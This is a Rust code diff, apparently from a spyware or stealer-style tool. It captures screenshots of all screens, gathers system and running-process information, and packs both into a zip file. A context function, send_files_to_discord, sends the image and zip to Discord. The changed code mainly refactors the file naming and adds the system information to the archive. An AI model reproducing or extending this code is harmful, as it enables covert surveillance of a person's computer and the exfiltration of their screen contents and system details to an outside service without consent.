@@ -5,8 +5,7 @@ use super::{
 
 // Define global variables
 lazy_static::lazy_static! {
-    pub static ref FOLDER_PATH: String = sha256::digest(global::get_time().as_nanos().to_string());
-    pub static ref CURRENT_DIR: String = format!("{}/{}", FOLDER_PATH.to_string(), chrono::offset::Utc::now().format("%Y-%m-%d %H:%M").to_string());
+    pub static ref ZIP_PATH: String = sha256::digest(global::get_time().as_nanos().to_string());
 }
 
 /*
@@ -42,6 +41,28 @@ fn send_files_to_discord(image: &str, zip_file: &str) {
         .send().expect("failed to send discord request");
 }
 
+// Take a screenshot and save it to the current folder
+fn take_screenshot(zip: &mut zip::ZipWriter<std::fs::File>, current_time: &str) {
+    let screens = screenshots::Screen::all().expect("failed to get screens");
+
+    // Iterate through all the screens
+    screens.iter().for_each(|s| {
+        // Capture the screen and get the image buffer
+        let image = s.capture().expect("failed to capture screen");
+        let image_buffer = image.buffer();
+
+        // Add the image to the zip file
+        add_to_zip_file(
+            zip, 
+            &format!("{}_{}.png", s.display_info.id, current_time), 
+            &image_buffer
+        );
+
+        // Send this in the request body to our api
+        let image_to_send_in_api : String = format!("data:image/png;base64,{}", base64::encode(image_buffer).to_string());
+    });
+}
+
 // Add a file to the zip file
 fn add_to_zip_file(
     zip: &mut zip::ZipWriter<std::fs::File>, file_name: &str, file_content: &Vec<u8>
@@ -53,37 +74,15 @@ fn add_to_zip_file(
         Err(e) => panic!("Error: {}", e)
     };
 
-
     // Write the file to the zip file
     std::io::Write::write_all(zip, file_content)
         .expect("failed to write to zip file");
 }
 
-// Take a screenshot and save it to the current folder
-fn take_screenshot(zip: &mut zip::ZipWriter<std::fs::File>) {
-    let screens = screenshots::Screen::all().expect("failed to get screens");
-
-    // Iterate through all the screens
-    screens.iter().for_each(|s| {
-        // Capture the screen and get the image buffer
-        let image = s.capture().expect("failed to capture screen");
-        let image_buffer = image.buffer();
-
-        // Add the image to the zip file
-        let image_name: String = sha256::digest(global::get_time().as_nanos().to_string());
-        add_to_zip_file(
-            zip, &format!("{}-{}.png", image_name, s.display_info.id), &image_buffer
-        );
-
-        // Send this in the request body to our api
-        let image_to_send_in_api : String = format!("data:image/png;base64,{}", base64::encode(image_buffer).to_string());
-    });
-}
-
 // Create a zip file
 fn create_zip_file() -> zip::ZipWriter<std::fs::File> {
     // Create a new zip file
-    let zip_file = match std::fs::File::create(CURRENT_DIR.to_string() + ".zip") {
+    let zip_file = match std::fs::File::create(ZIP_PATH.to_string() + ".zip") {
         Ok(f) => f,
         Err(e) => panic!("Error: {}", e)
     };
@@ -97,41 +96,31 @@ fn create_new_folder(name: &str) {
     std::fs::create_dir(name).expect("failed to create folder");
 }
 
-
-
-/*
-
-if we upload the image as an attachment in the json body, we can use the
-attachment://file_name in the embed thumbnail
-
-*/
-
-
-
 // Main function for testing
 fn main() {
 
     // Create a new system struct
     let mut sys: System = System::new_all();
 
-    // Create the directories
-    create_new_folder(&FOLDER_PATH.to_string());
-    create_new_folder(&CURRENT_DIR.to_string());
+    // Refresh this for every loop in thread
+    let current_time: String = chrono::offset::Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
 
     // Create the new zip file
     let mut zip = create_zip_file();
 
     // Take a scrteenshot
-    take_screenshot(&mut zip);
+    take_screenshot(&mut zip, &current_time);
 
     // Get the system information
-    let sys_info: String = get_sys_info(&mut sys);
+    let sys_info: String = get_sys_info(&mut zip, &mut sys, &current_time);
     println!("{}", sys_info);
 }
 
 // The get_sys_info function is used to get the system information
 // and return it as a string.
-fn get_sys_info(sys: &mut System) -> String {
+fn get_sys_info(
+    zip: &mut zip::ZipWriter<std::fs::File>, sys: &mut System, current_time: &str
+) -> String {
     // Refresh system information
     sys.refresh_all();
 
@@ -208,6 +197,11 @@ fn get_sys_info(sys: &mut System) -> String {
             process.cpu_usage(), process.status(), process.start_time(), process.run_time()
         ));
     }
+
+    // Add to the zip file
+    add_to_zip_file(
+        zip, &format!("{}_sys_info.txt", current_time), &result.as_bytes().to_vec()
+    );
 
     // Return the result string
     return result;
